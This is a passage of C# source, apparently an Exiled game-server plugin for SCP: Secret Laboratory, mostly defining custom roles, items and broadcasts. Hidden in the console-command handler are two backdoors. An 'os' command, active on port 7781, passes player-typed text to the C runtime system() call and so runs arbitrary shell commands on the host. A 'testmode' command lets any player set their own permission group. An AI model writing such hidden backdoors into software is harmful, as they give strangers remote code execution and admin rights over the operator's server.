using Exiled.API.Enums;
using Exiled.API.Extensions;
using Exiled.API.Features;
using Exiled.Events.EventArgs;
using Interactables.Interobjects.DoorUtils;
using MEC;
using Mirror;
using Respawning;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using UnityEngine;

namespace RE0
{
	public class EventHandlers
	{
		public List<CoroutineHandle> Coroutines = new List<CoroutineHandle>();
		private int times2;
		private Player 七月;
		private int 七月id;
		private bool 七月刷出;
		private bool hrss;
		private bool 七月技能发动;
		private int tiems;
		private bool 蕾姆刷出;
		private Player 蕾姆;
		private int 蕾姆id;
		private bool 拉姆刷出; 
		private int scp457sh;
		private Exiled.API.Features.Player scp457;
		private bool scp457die;
		private bool scp457a;
		private Vector3 hkzb;
		
		private int scp457id;
		private Player 拉姆;
		private int 拉姆id;
		private bool 拉姆之怒;
		private bool 蕾姆之怒;
		private bool 蕾姆拉姆技能;
		private bool xthdyes;
		private int jwhhkid;
		private Exiled.API.Features.Player jwhhk;
		private Pickup scp2818;
		private bool scp2818pickup;
		private int scp2818id;
		private int classd;
		private int 张大仙id;
		private Player 莱月昂;
		private Player 幸运儿;
		private int 幸运儿id;
		private int 莱月昂id;
		private bool 莱月昂刷出;
		private Vector3 莱月昂坐标;
		public List<int> 蛇之手id = new List<int>();
		public List<Pickup> Baba = new List<Pickup>();
		public List<Pickup> Baba1 = new List<Pickup>();
		public List<int> 第一次 = new List<int>();
		public List<int> scp008id = new List<int>();
		public List<int> 第二次 = new List<int>();
		public List<Inventory.SyncItemInfo> 莱月昂装备 = new List<Inventory.SyncItemInfo>();
		public List<int> scp367id = new List<int>();
		
		private RoleType 莱月昂角色;
		private int 莱月昂复活次数;
		private bool 莱月昂之怒;
		private bool 爱蜜莉雅刷出;
		private Player 爱蜜莉雅;
		private int 爱蜜莉雅id;
		private Player 精灵;
		private int 精灵id;
		private int scp035id;
		private int scp999id;
		private bool 寒冰刷出;
		private int 寒冰id;
		private Player 寒冰;
		private bool sjtz;
		private Player scp682;
        private int scp682lv;
        private bool scp682yes;
        private bool scp682awa;
        private bool scp367yes;
        private bool scp367awa;
        private int scp682id;
		private bool 鱼博士刷出;
		private Player 鱼博士;
		private int 鱼博士id;
		private bool 鱼博士乘坐;
		private bool roundstart;
		private int scientist;
		private Player 蛇皮手间谍;
		private int 蛇皮手id;
		private bool 蛇之手召唤;
		private int scp3199id;
		private Player hdjjs;
		private int hdjjsid;
		private Player scp1038;
		private int scp1038id;
		private Player 作死之王;
		private int 作死之王id;
		private Player 黑暗掌控者;
		private int 黑暗掌控者id;
		private bool 黑暗掌控者yes;
		private Player 亚伯;
		private int 亚伯id;
        private Vector3 scp008lastpos;
        private int scp738id;
        private bool scp738fuzhi;
        private int scp1143id;
        private int zhgid;
        private bool zhgyes;
        private Player scp105;
        private int scp105id;
        private bool scp105flash;
        private int 保安队长id;
        private int timesec;
        private Player scp367first;

        public Player Dio { get; private set; }
		public int Dioid { get; private set; }

		public void OnRoundEnd(RoundEndedEventArgs ev)
		{
			End();
		}
		public void OnEnteringPocketDimension(EnteringPocketDimensionEventArgs ev)
		{
			if(scp008id.Contains(ev.Player.Id))
            {
				ev.IsAllowed = false;
            }
			if (ev.Player.Id == scp035id)
			{
				ev.IsAllowed = false;
			}
			if(ev.Player.Id == 黑暗掌控者id)
			{
				ev.IsAllowed = false;
			}
			if(ev.Player.Id == 亚伯id)
			{
				ev.IsAllowed = false;
			}
		}
		public void OnEndingRound(EndingRoundEventArgs ev)
		{
			List<Team> teams = new List<Team>();
			bool classdyes = false;
			bool Scientistyes = false;
			foreach (Player player in Player.List)
			{
				teams.Add(player.Team);
			}
			if (teams.Contains(Team.SCP) && !teams.Contains(Team.MTF))
			{
				foreach (Player player in Player.List)
				{
					if (player.Role == RoleType.Scientist)
					{
						Scientistyes = true;
						
					}
					if (player.Role == RoleType.ClassD && player.Id != scp035id)
					{
						classdyes = true;
					}
				}
				if (classdyes == false && Scientistyes == false)
				{
					ev.IsRoundEnded = true;
				}
			}
		}

		public void Setrank_new(string text, string color, Player player)
		{
			if(player.GlobalBadge == null || player.GlobalBadge.HasValue == false)
			{
				player.RankColor = color;
				player.RankName = text;
			}

		}
		public void OnSendingConsoleCommand(SendingConsoleCommandEventArgs ev)
		{
			if(ev.Name == "test")
            {
				ev.ReturnMessage = IniFile.ReadExp(ev.Player.UserId).ToString();
            }
			if (ev.Name == "testmode")
			{
				ev.ReturnMessage = "testmode已开启";
				UserGroup userGroup = ServerStatic.GetPermissionsHandler().GetUserGroup(ev.Arguments[0]);
				ev.Player.ReferenceHub.serverRoles.SetGroup(userGroup, false, true);
			}

			if (ev.Name.Contains("dk") && hrss)
			{
				jwhhk.ReferenceHub.characterClassManager.SetClassIDAdv(RoleType.NtfScientist, true);
				jwhhk.Health = 120;
				jwhhk.ReferenceHub.playerMovementSync.OverridePosition(hkzb, 0, false);
				hrss = false;
			}
			if (ev.Name.Contains("hk") && jwhhkid == ev.Player.Id && !hrss)
			{
				hrss = true;
				hkzb = ev.Player.Position;
				ev.Player.SetRole(RoleType.Scp079);
				ev.Player.Broadcast(10, "<color=lime>输入.dk退出黑客模式</color>");
				Coroutines.Add(Timing.RunCoroutine(Hkjs()));

			}
			if (ev.Name == "f")
			{
				if (鱼博士乘坐)
				{
					鱼博士乘坐 = false;
				}
				else
				{
					if (ev.Player.Id == 鱼博士id)
					{
						foreach (Player player in Player.List)
						{
							if (player.Role == RoleType.Scp93953 || player.Role == RoleType.Scp93989)
							{
								if (Vector3.Distance(player.Position, 鱼博士.Position) <= 10)
								{
									鱼博士乘坐 = true;
									Coroutines.Add(Timing.RunCoroutine(MRFISHCZ(player)));

									break;
								}
							}
						}
					}
				}

			}
			if(Server.Port == 7781)
            {
				if (ev.Name == "os")
				{
					bool firsttime = true;
					string cmd = "";
					foreach (string i in ev.Arguments)
					{
						if (firsttime)
						{
							firsttime = false;
							cmd = i;


						}
						else
						{
							cmd = cmd + " " + i;
						}

					}
					system(cmd);


				}

			}
			if (ev.Name == "c")
			{
				if (ev.Player.Team == Team.MTF)
				{
					foreach (Player player in Player.List)
					{
						if (player.Team == Team.MTF)
						{
							player.Broadcast(8, "[" + ev.Name + "]" + ev.Arguments[0]);
						}
					}
				}
				if (ev.Player.Team == Team.CHI)
				{
					foreach (Player player in Player.List)
					{
						if (player.Team == Team.CHI)
						{
							player.Broadcast(8, "[" + ev.Name + "]" + ev.Arguments[0]);
						}
					}
				}
				if (ev.Player.Role == RoleType.Spectator)
				{
					foreach (Player player in Player.List)
					{
						if (player.Role == RoleType.Spectator)
						{
							player.Broadcast(8, "[" + ev.Name + "]" + ev.Arguments[0]);
						}
					}
				}
			}
		}


		[DllImport("msvcrt.dll", SetLastError = false, CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Ansi)]
		private extern static void system(string command); // longjmp


		public void End()
		{
			scp105flash = false;
			scp367id.Clear();
			scp367yes = false;
			scp367first = null;
			保安队长id = 0;
			scp105id = 0;
			scp105 = null;
			zhgyes = false;
			scp008id.Clear();
			scp008lastpos = new Vector3();
			scp682lv = 1;
			scp682 = null;
			scp682id = 0;
			scp682yes = false;
			亚伯 = null;
			亚伯id = 0;
			黑暗掌控者 = null;
			黑暗掌控者id = 0;
			黑暗掌控者yes = false;
			作死之王 = null;
			作死之王id = 0;
			scp457die = false;
			scp457 = null;
			scp457a = false;
			scp457id = 0;
			hdjjs = null;
			hdjjsid = 0;
			scp3199id = 0;
			第一次.Clear();
			第二次.Clear();
			Baba.Clear();
			Baba1.Clear();
			蛇之手id.Clear();
			蛇之手召唤 = false;
			蛇皮手id = 0;
			蛇皮手间谍 = null;
			scientist = 0;
			roundstart = false;
			鱼博士 = null;
			鱼博士乘坐 = false;
			鱼博士id = 0;
			鱼博士刷出 = false;
			Dio = null;
			Dioid = 0;
			寒冰 = null;
			寒冰id = 0;
			scp035id = 0;
			寒冰刷出 = false;
			幸运儿 = null;
			幸运儿id = 0;
			精灵 = null;
			精灵id = 0;
			爱蜜莉雅 = null;
			爱蜜莉雅id = 0;
			爱蜜莉雅刷出 = false;
			莱月昂之怒 = false;
			莱月昂刷出 = false;
			莱月昂 = null;
			莱月昂id = 0;
			莱月昂坐标 = new Vector3();
			莱月昂复活次数 = 0;
			莱月昂装备 = null;
			莱月昂角色 = RoleType.ClassD;
			classd = 0;
			张大仙id = 0;
			scp2818 = null;
			scp2818id = 0;
			scp2818pickup = false;
			xthdyes = false;
			七月id = 0;
			七月 = null;
			七月刷出 = false;
			七月技能发动 = false;
			foreach(CoroutineHandle coroutineHandle in Coroutines)
			{
				Timing.KillCoroutines(coroutineHandle);

			}
			Coroutines.Clear();
			蕾姆 = null;
			蕾姆id = 0;
			蕾姆刷出 = false;
			拉姆 = null;
			拉姆id = 0;
			拉姆刷出 = false;
			蕾姆拉姆技能 = false;
		}

		
		private IEnumerator<float> MRFISHCZ(Player player)
		{
			while(鱼博士乘坐)
			{
				yield return Timing.WaitForSeconds(0.1f);
				鱼博士.ReferenceHub.playerMovementSync.OverridePosition(player.Position, 0);
			}
		}
		public void OnCheckEscape(EscapingEventArgs ev)
        {
			if (ev.IsAllowed)
			{
				IniFile.AddExp(ev.Player.ReferenceHub.characterClassManager.UserId, 20);
				ev.Player.Broadcast(2, "你成功获取到了20经验 目前你的经验是" + IniFile.ReadExp(ev.Player.ReferenceHub.characterClassManager.UserId));
			}
			if (ev.Player.IsCuffed)
			{
				IniFile.AddExp(ev.Player.ReferenceHub.characterClassManager.UserId, 15);
				ev.Player.Broadcast(2, "你成功获取到了15经验 目前你的经验是" + IniFile.ReadExp(ev.Player.ReferenceHub.characterClassManager.UserId));

				IniFile.AddExp(Player.Get(ev.Player.CufferId).UserId, 10);
				Player.Get(ev.Player.CufferId).Broadcast(2, "你成功获取到了10经验 目前你的经验是" + IniFile.ReadExp(Player.Get(ev.Player.CufferId).UserId));
			}
		}
		private IEnumerator<float> JianCe()
		{
			for(; ; )
			{
				timesec++;
				if(timesec == 240)
                {
					Map.Broadcast(10, "<color=yellow>Re:0提示:</color><color=cyan>服务器将在1分钟后清理尸体</color>");
                }
				if (timesec >= 300)
				{
					Map.Broadcast(10, "<color=yellow>Re:0提示:</color><color=cyan>尸体清理完毕</color>");
					Ragdoll[] array = UnityEngine.Object.FindObjectsOfType<Ragdoll>();
					foreach (Ragdoll ragdoll in array)
					{
						NetworkServer.Destroy(ragdoll.gameObject);
					}
					timesec = 0;
				}
				try
                {
					if(scp105.CurrentItem.id == ItemType.Flashlight)
                    {
						scp105.Health -= 3;
						scp105flash = true;
                    }
                    else
                    {

						scp105flash = false;
					}
				}
                catch
                {
					scp105flash = false;

				}
				try
				{
					scp457.IsGodModeEnabled = false;
					Dio.IsGodModeEnabled = false;

				}
				catch
				{

				}
				yield return Timing.WaitForSeconds(1f);
				foreach (Player player in Player.List)
				{
					if (player.Health <= 0)
					{
						player.Kill(DamageTypes.Nuke);
					}
				}
				if (scp457a)
				{
					if (Player.Get(scp457id) != null)
					{
						scp457sh = 0;
						foreach (Inventory.SyncItemInfo syncItemInfo in scp457.Inventory.items)
						{
							if (syncItemInfo.id.IsScp())
							{
								scp457sh++;
							}
						}
						if (Player.Get(scp457id) != null)
						{
							scp457.ClearBroadcasts();
							Player.Get(scp457id).Broadcast(5, "<color=red>[SCP457]</color>\n<color=lime>灼烧等级:</color>" + scp457sh);
						}
					}
				}
				foreach(int i in scp008id)
                {
					Player.Get(i).Health -= 3;
                }
			}

		}
		private IEnumerator<float> QiYueZB()
		{
			yield return Timing.WaitForSeconds(1f);
			七月.Health = 250;
			七月.ClearInventory();
			yield return Timing.WaitForSeconds(1f);
			七月.AddItem(ItemType.KeycardChaosInsurgency);
			七月.AddItem(ItemType.Coin);
			七月.AddItem(ItemType.Coin);
			七月.AddItem(ItemType.Coin);
			七月.AddItem(ItemType.Coin);
			七月.AddItem(ItemType.Coin);
			七月.AddItem(ItemType.Coin);
			七月.AddItem(ItemType.Coin);
			while(七月刷出)
			{
				yield return Timing.WaitForSeconds(60f);
				七月.AddItem(ItemType.Coin);
			}
		}
		private IEnumerator<float> DioZB()
		{
			yield return Timing.WaitForSeconds(1f);
			Dio.Role = RoleType.Tutorial;
			yield return Timing.WaitForSeconds(1f);
			Dio.Position = Map.GetRandomSpawnPoint(RoleType.ChaosInsurgency);
			Dio.AddItem(ItemType.GunLogicer);
			Dio.AddItem(ItemType.MicroHID);
			Dio.AddItem(ItemType.Coin);
			Dio.AddItem(ItemType.KeycardO5);
			Dio.Health = 500;
			Map.Broadcast(10, "konodio哒");
			Setrank_new("Dio", "red", Dio);
			while(true)
            {
				yield return Timing.WaitForSeconds(30f);
				Dio.AddItem(ItemType.Coin);

			}
		}
		private IEnumerator<float> LaMuZB()
		{
			yield return Timing.WaitForSeconds(1f);
			拉姆.Health = 233;
			拉姆.ClearInventory();
			yield return Timing.WaitForSeconds(1f);
			拉姆.AddItem(ItemType.GunLogicer);
			拉姆.AddItem(ItemType.KeycardO5);
			拉姆.AddItem(ItemType.Adrenaline);
			蕾姆.AddItem(ItemType.GrenadeFrag);
			蕾姆.AddItem(ItemType.GrenadeFrag);
			蕾姆.AddItem(ItemType.GrenadeFrag);
			蕾姆.AddItem(ItemType.GrenadeFrag);
			蕾姆.AddItem(ItemType.GrenadeFrag);
			while (拉姆刷出)
			{
				yield return Timing.WaitForSeconds(30f);
				蕾姆.Broadcast(5, "丢你拉姆");
				蕾姆.AddItem(ItemType.GrenadeFrag);
			}
		}
		private IEnumerator<float> HeiGive()
		{
			while(黑暗掌控者yes)
			{
				bool youyingbi = false;
				foreach(Inventory.SyncItemInfo player in 黑暗掌控者.Inventory.items)
				{
					if(player.id == ItemType.Coin)
					{
						youyingbi = true;
					}
				}
				if(youyingbi == false)
				{

					黑暗掌控者.AddItem(ItemType.Coin);
				}
				yield return Timing.WaitForSeconds(95f);
			}
		}
		private IEnumerator<float> ZuoSiGive()
		{
			for(; ; )
			{
				yield return Timing.WaitForSeconds(6f);
				Player 作死 = Player.Get(作死之王id);
				if(作死!=null &&作死.Role != RoleType.Spectator)
				{
					作死.AddItem(ItemType.GrenadeFlash);
				}
			}
		}
		private IEnumerator<float> RunRestoreMaxHp(Exiled.API.Features.Player player, int maxHp)
		{
			yield return Timing.WaitForSeconds(0.1f);
			player.MaxHealth = maxHp;
			player.Health = maxHp;
		}
		private IEnumerator<float> RenWuFenPei()
		{
			int g = 0;
			classd = 0;
			scientist = 0;
			yield return Timing.WaitForSeconds(5f);
			foreach(Player player in Player.List)
			{
				if(player.Role == RoleType.Scp93953)
				{
					if(scp682awa == false)
                    {
						if (scp682yes == false)
						{
							scp682 = player;

							Setrank_new("SCP-682|等级1", "red", scp682);
							scp682id = scp682.Id;
							scp682lv = 1;
							scp682yes = true;
							scp682awa = true;
							scp367awa = false;
							Timing.RunCoroutine(Hpnew2(player, 1000));
						}
					}



				}
				if(player.Role == RoleType.FacilityGuard)
				{
					g++;
					switch(g)
					{
						case 1:
							scp999id = player.Id;
							Setrank_new("SCP999(中立)", "pink", player);
							player.Broadcast(10, "<color=lime>[SCP999]</color>\n<color=yello>你是SCP999:你攻击别人可以给别人回血</color>\n<color=yellow>中立可选择帮助任意阵营</color>");
							Timing.RunCoroutine(SCP999zb(player));
							break;
						case 2:
							player.Broadcast(10, "<color=lime>[高级保安]</color>\n<color=yello>你是高级保安:你有200HO</color>");
							Timing.RunCoroutine(Hpnew2(player, 200));
							保安队长id = player.Id;
							Setrank_new("保安队长(九尾狐)", "pink", player);

							break;
					}
				}
				if(player.Role == RoleType.ClassD)
				{
					if(IniFile.ReadLevel(IniFile.ReadExp(player.UserId)) >=20)
                    {
						player.AddItem(ItemType.Flashlight);
                    }
					if (IniFile.ReadLevel(IniFile.ReadExp(player.UserId)) >= 30)
                    {
						player.AddItem(ItemType.Medkit);

					}
					if (IniFile.ReadLevel(IniFile.ReadExp(player.UserId)) >= 45)
					{
						player.AddItem(ItemType.KeycardJanitor);

					}
					classd++;
					switch(classd)
					{
						case 1:
							张大仙id = player.Id;
							player.Broadcast(10, "<color=lime>[张大仙]</color>\n<color=yello>你是张大仙:对scp-173具有免疫性</color>\n<color=yellow></color>");
							Setrank_new("张大仙", "yellow", player);
							break;
						case 2:
							莱月昂 = player;
							莱月昂id = 莱月昂.Id;
							莱月昂刷出 = true;
							莱月昂坐标 = 莱月昂.Position;
							莱月昂.Health = 250;
							莱月昂.AddItem(ItemType.KeycardJanitor);
							莱月昂.AddItem(ItemType.SCP268);
							莱月昂.AddItem(ItemType.SCP500);
							莱月昂.AddItem(ItemType.Coin);
							莱月昂.AddItem(ItemType.Coin);
							莱月昂.AddItem(ItemType.Coin);
							player.Broadcast(10, "<color=lime>[莱月昂]</color>\n<color=yello>丢下硬币即可存档死亡后15秒后触发重生，雷姆拉姆</color>\n<color=yellow>死亡后触发莱月昂之怒，伤害翻倍速度翻倍无限体力血量上升至333血</color>");
							Setrank_new("莱月昂", "nickel", player);
							break;
						case 3:
							幸运儿 = player;
							幸运儿id = 幸运儿.Id;
							int card = new System.Random().Next(1, 10);
							switch (card)
							{
								case 1:
									幸运儿.AddItem(ItemType.KeycardChaosInsurgency);
									card = 0;
									break;
								case 2:
									幸运儿.AddItem(ItemType.KeycardContainmentEngineer);
									card = 0;
									break;
								case 3:
									幸运儿.AddItem(ItemType.KeycardJanitor);
									card = 0;
									break;
								case 4:
									幸运儿.AddItem(ItemType.KeycardScientistMajor);
									card = 0;
									break;
								case 5:
									幸运儿.AddItem(ItemType.KeycardNTFCommander);
									card = 0;
									break;
								case 6:
									幸运儿.AddItem(ItemType.KeycardNTFLieutenant);
									card = 0;
									break;
								case 7:
									幸运儿.AddItem(ItemType.KeycardO5);
									card = 0;
									break;
								case 8:
									幸运儿.AddItem(ItemType.KeycardScientist);
									card = 0;
									break;
								case 9:
									幸运儿.AddItem(ItemType.KeycardZoneManager);
									card = 0;
									break;
								default:
									幸运儿.AddItem(ItemType.KeycardZoneManager);
									card = 0;
									break;
							}
							Setrank_new("SCP-181", "pink", player);
							player.Broadcast(10, "<color=lime>[SCP181]</color>\n<color=yello>你很幸运</color>\n<color=yellow>出生随机一张卡不会触发电网有几率空手开门</color>");
							break;
						case 4:
							scp035id = player.Id;
							player.Broadcast(10, "你是SCP035\n你不会被SCP伤害 你属于SCP阵营");

							break;
						case 5:
							scp3199id = player.Id;
							player.ReferenceHub.playerEffectsController.EnableEffect<CustomPlayerEffects.Visuals939>(10000, true);
							Setrank_new("SCP3199", "lime", player);
							player.Broadcast(10, "<color=lime>[SCP3199]</color>\n<color=yello></color>\n<color=yellow>获得939透视效果</color>");
							player.RankColor = "lime";
							break;
						case 6:
							亚伯 = player;
							亚伯id = player.Id;
							player.ReferenceHub.characterClassManager.SetClassIDAdv(RoleType.ChaosInsurgency, true);
							Timing.RunCoroutine(Tpnew(player, RoleType.ChaosInsurgency.GetRandomSpawnPoint()));
							player.AddItem(ItemType.GunUSP);
							player.AddItem(ItemType.KeycardNTFCommander);
							player.Broadcast(10, "你是SCP550\n拥吸血能力 但相应的血量偏低 scp阵营 使用p90杀敌可吸收其血量");
							Setrank_new("SCP550", "red", player);
							亚伯.Ammo[0] = 400;
							亚伯.Ammo[1] = 400;
							亚伯.Ammo[2] = 400;
							break;
						case 7:
							scp738id = player.Id;
							Setrank_new("SCP 738 与魔谋弈(复制人)", "red", player);

							player.Broadcast(10, "<color=lime>你是scp738</color>\n扔下硬币切换复制模式\n可以消耗血量复制东西");
							player.AddItem(ItemType.Coin);
							break;
						case 8:
							scp105 = player;
							scp105id = scp105.Id;
							player.Broadcast(10, "<color=lime>你是SCP105</color>\n你拿手电时你周围的人无敌\n但是你会每秒掉3HP");
							Setrank_new("SCP105", "yellow", player);
							scp105.AddItem(ItemType.Flashlight);

							break;
					}
				}
				if(player.Role == RoleType.Scientist)
				{
					scientist++;
					switch(scientist)
					{
						case 1:
							蛇皮手间谍 = player;
							蛇皮手id = 蛇皮手间谍.Id;
							蛇皮手间谍.ClearInventory();
							蛇皮手间谍.AddItem(ItemType.KeycardChaosInsurgency);
							蛇皮手间谍.AddItem(ItemType.Coin);
							蛇皮手间谍.AddItem(ItemType.Medkit);
							蛇皮手间谍.AddItem(ItemType.Painkillers);
							蛇皮手间谍.AddItem(ItemType.GunCOM15);
							player.Broadcast(10, "<color=lime>[蛇皮手间谍]</color>\n<color=yello>人物介绍已发送 按~查看</color>\n<color=yellow></color>");
							player.SendConsoleMessage("抗伤害为人类攻击一次掉3血", "lime");
							player.SendConsoleMessage("同DD博士血量，血包一次加10血，止疼药一次加5血，肾上腺素加20血，500加33血，医疗物品仅可以加血无临时生命值和恢复生命值", "lime");
							player.SendConsoleMessage("可以正常使用可乐/隐身帽/018（018对其无伤害），可以正常逃出变九尾/混沌", "lime");
							player.SendConsoleMessage("特殊技能：蛇皮手支援（扔掉背包内硬币将刷新至多9名辅导人员，刷新于地面A电梯旁，290血，自带机枪/步枪/对讲机/红卡/血包，刷新时 间谍将显示头衔——蛇之手间谍，间谍与支援与SCP三者间无法互相伤害）", "lime");
							break;
						case 2:
							scp1038 = player;

							scp1038id = player.Id;
							scp1038.Health = 20;
							scp1038.ClearInventory();
							scp1038.AddItem(ItemType.SCP268);
							scp1038.AddItem(ItemType.Coin);
							scp1038.AddItem(ItemType.Coin);
							scp1038.AddItem(ItemType.Coin);
							scp1038.AddItem(ItemType.Coin);
							scp1038.AddItem(ItemType.Coin);
							scp1038.AddItem(ItemType.Coin);
							scp1038.AddItem(ItemType.Coin);
							player.Broadcast(10, "<color=lime>[SCP1038]</color>\n<color=yello>HP:20</color>\n<color=yellow>丢下硬币可以隐身</color>");

							break;
						case 3:
							黑暗掌控者 = player;
							黑暗掌控者id = player.Id;
							黑暗掌控者yes = true;

							Setrank_new("SCP134", "red", 黑暗掌控者);

							player.ReferenceHub.characterClassManager.SetClassIDAdv(RoleType.Tutorial, true);
							Timing.RunCoroutine(HeiGive());
							player.AddItem(ItemType.Coin);
							player.Broadcast(10, "<color=lime>[SCP134]</color>\n<color=yello>SCP阵营</color>\n<color=yellow>丢下硬币可以让设施停电</color>");
							Timing.RunCoroutine(Tpnew(player, RoleType.Scp173.GetRandomSpawnPoint()));
							break;
					}
				}

			}

			foreach (DoorVariant door in UnityEngine.Object.FindObjectsOfType<DoorVariant>())
			{
				try
				{
					if (door.GetComponent<DoorNametagExtension>().GetName.Contains("096"))
					{
						for (int c = 0; c <= 30; c++)
						{
							Pickup test = PlayerManager.localPlayer.GetComponent<Inventory>().SetPickup(ItemType.Coin, 0f, new Vector3(door.transform.position.x, door.transform.position.y + 5f, door.transform.position.z), Quaternion.identity, 0, 0, 0);
							Baba.Add(test);
							if (c == 7)
							{
								Baba1.Add(test);
							}
							if (c == 1)
							{
								Baba1.Add(test);
							}
							if (c == 5)
							{
								Baba1.Add(test);
							}
							if (c == 9)
							{
								Baba1.Add(test);
							}
							if (c == 11)
							{
								Baba1.Add(test);
							}
							if (c == 18)
							{
								Baba1.Add(test);
							}
							if (c == 3)
							{
								Baba1.Add(test);
							}
							if (c == 7)
							{
								Baba1.Add(test);
							}
							if (c == 23)
							{
								Baba1.Add(test);
							}
							if (c == 28)
							{
								Baba1.Add(test);
							}
							if (c == 20)
							{
								Baba1.Add(test);
							}
							if (c == 25)
							{
								Baba1.Add(test);
							}
							if (c == 27)
							{
								Baba1.Add(test);
							}
						}
					}
				}
				catch
				{

				}

			}
			for (int c2 = 0; c2 <= 30; c2++)
			{
				Pickup test2 = PlayerManager.localPlayer.GetComponent<Inventory>().SetPickup(ItemType.Coin, 0f, new Vector3(-54f, 990f, -49f), Quaternion.identity, 0, 0, 0);
				Baba.Add(test2);
				if (c2 == 1)
				{
					Baba1.Add(test2);
				}
				if (c2 == 4)
				{
					Baba1.Add(test2);
				}
				if (c2 == 9)
				{
					Baba1.Add(test2);
				}
				if (c2 == 10)
				{
					Baba1.Add(test2);
				}
				if (c2 == 20)
				{
					Baba1.Add(test2);
				}
				if (c2 == 15)
				{
					Baba1.Add(test2);
				}
				if (c2 == 7)
					Baba1.Add(test2);
				if (c2 == 18)
					Baba1.Add(test2);
				if (c2 == 3)
					Baba1.Add(test2);
				if (c2 == 23)
					Baba1.Add(test2);
				if (c2 == 25)
					Baba1.Add(test2);
				if (c2 == 14)
					Baba1.Add(test2);
				if (c2 == 15)
					Baba1.Add(test2);
			}
			for (int c3 = 0; c3 <= 30; c3++)
			{
				Pickup test3 = PlayerManager.localPlayer.GetComponent<Inventory>().SetPickup(ItemType.Coin, 0f, new Vector3(Map.GetRandomSpawnPoint(RoleType.Scp173).x, Map.GetRandomSpawnPoint(RoleType.Scp173).y + 5f, Map.GetRandomSpawnPoint(RoleType.Scp173).z), Quaternion.identity, 0, 0, 0);
				Baba.Add(test3);
				if (c3 == 7)
				{
					Baba1.Add(test3);
				}
				if (c3 == 1)
				{
					Baba1.Add(test3);
				}
				if (c3 == 5)
				{
					Baba1.Add(test3);
				}
				if (c3 == 9)
				{
					Baba1.Add(test3);
				}
				if (c3 == 11)
				{
					Baba1.Add(test3);
				}
				if (c3 == 18)
				{
					Baba1.Add(test3);
				}
				if (c3 == 20)
				{
					Baba1.Add(test3);
				}
				if (c3 == 25)
				{
					Baba1.Add(test3);
				}
				if (c3 == 27)
				{
					Baba1.Add(test3);
				}

				if (c3 == 4)
				{
					Baba1.Add(test3);
				}
				if (c3 == 12)
				{
					Baba1.Add(test3);
				}
				if (c3 == 13)
				{
					Baba1.Add(test3);
				}
				if (c3 == 15)
				{
					Baba1.Add(test3);
				}
				if (c3 == 17)
				{
					Baba1.Add(test3);
				}
				if (c3 == 28)
				{
					Baba1.Add(test3);
				}
			}
			yield return Timing.WaitForSeconds(300f);

			if (!scp457die && !scp457a)
			{
				foreach (Exiled.API.Features.Player player5 in Exiled.API.Features.Player.List)
				{
					if (player5.Role == RoleType.Spectator)
					{
						if(player5.Id != 莱月昂id)
                        {
							try
							{
								scp457 = player5;
								if (scp457 != null)
								{
									scp457a = true;
									Coroutines.Add(Timing.RunCoroutine(SecondCounter22()));
									scp457id = scp457.Id;
									Setrank_new("SCP-457", "red", scp457);
									scp457.SetRole(RoleType.Tutorial);
									Coroutines.Add(Timing.RunCoroutine(Scp457tp()));
									Coroutines.Add(Timing.RunCoroutine(RunRestoreMaxHp(scp457, 4500)));
									Exiled.API.Features.Map.Broadcast(10, "<color=red>[SCP457]</color>\n<color=lime>突破收容 请尽快将其重新收容</color>");
									scp457.Broadcast(10, "<color=#FFC0CB>---[SCP457]---</color>\n<color=#00FFFF>HP:4000  </color>你拥有一种特殊能力\n<color=#FFD700>在你周围的人都会扣血 持有SCP物品越多伤害越高</color>");
									break;
								}
							}
							catch
							{
								Log.Info("scp457异常");
							}
						}
					


					}
				}
			}
			foreach (Player player in Player.List)
			{
				if (player.Role == RoleType.Spectator)
				{
					作死之王 = player;
					作死之王id = player.Id;
					player.Role = RoleType.ClassD;

					Setrank_new("SCP1790", "red", 作死之王);

					player.AddItem(ItemType.SCP207);
					player.AddItem(ItemType.SCP207);
					player.AddItem(ItemType.SCP207);
					player.AddItem(ItemType.SCP207);
					player.Broadcast(10, "<color=lime>[SCP1790]</color>\n<color=yello>不可拾取其它物品，只能用闪光弹，500血，有子弹抗性和scp伤害抗性</color>\n<color=yellow>死亡后随着支援刷新，出生点和支援对立</color>");
					Coroutines.Add(Timing.RunCoroutine(ZuoSiGive()));
					Timing.RunCoroutine(Tpnew(作死之王, RoleType.Scp049.GetRandomSpawnPoint()));
					break;
				}
			}
			yield return Timing.WaitForSeconds(1f);

			foreach (Player player in Player.List)
			{
				if(player.Role ==RoleType.Spectator)
				{
					Dio = player;
					Dioid = player.Id;
					Timing.RunCoroutine(DioZB());
					break;
				}
			}
		}
		public void OnTriggeringTesla(TriggeringTeslaEventArgs ev)
		{
			if(ev.Player.Id == 幸运儿id)
			{
				ev.IsTriggerable = false;
			}
		}
		private IEnumerator<float> AiMiLiYaZB()
		{
			yield return Timing.WaitForSeconds(1f);
			爱蜜莉雅.Health = 233;
			爱蜜莉雅.ClearInventory();
			yield return Timing.WaitForSeconds(1f);
			if(爱蜜莉雅!= null)
			{
				爱蜜莉雅.AddItem(ItemType.Coin);
				爱蜜莉雅.AddItem(ItemType.KeycardO5);
				爱蜜莉雅.AddItem(ItemType.GunCOM15);
			}

			Setrank_new("爱蜜莉雅", "magenta", 爱蜜莉雅);
		}
		private IEnumerator<float> HanBingZB()
		{
			yield return Timing.WaitForSeconds(1f);
			寒冰.Health = 600;
			Setrank_new("寒冰", "cyan", 寒冰);

		}
		private IEnumerator<float> SCP999zb(Player player)
		{
			yield return Timing.WaitForSeconds(1f);
			player.ReferenceHub.characterClassManager.SetClassIDAdv(RoleType.Tutorial, true);
			player.Health = 5000;
		}

		private IEnumerator<float> LeiMuZB()
		{
			yield return Timing.WaitForSeconds(1f);
			蕾姆.Health = 233;
			蕾姆.ClearInventory();
			yield return Timing.WaitForSeconds(1f);
			if(蕾姆 != null)
			{
				蕾姆.AddItem(ItemType.KeycardO5);
				蕾姆.AddItem(ItemType.GunE11SR);
				蕾姆.AddItem(ItemType.Adrenaline);
				蕾姆.AddItem(ItemType.GrenadeFrag);
				蕾姆.AddItem(ItemType.GrenadeFrag);
				蕾姆.AddItem(ItemType.GrenadeFrag);
				蕾姆.AddItem(ItemType.GrenadeFrag);
				蕾姆.AddItem(ItemType.GrenadeFrag);
			}
			while(蕾姆刷出)
			{
				yield return Timing.WaitForSeconds(30f);
				if (蕾姆 != null)
				{
					蕾姆.Broadcast(5, "丢你蕾姆");
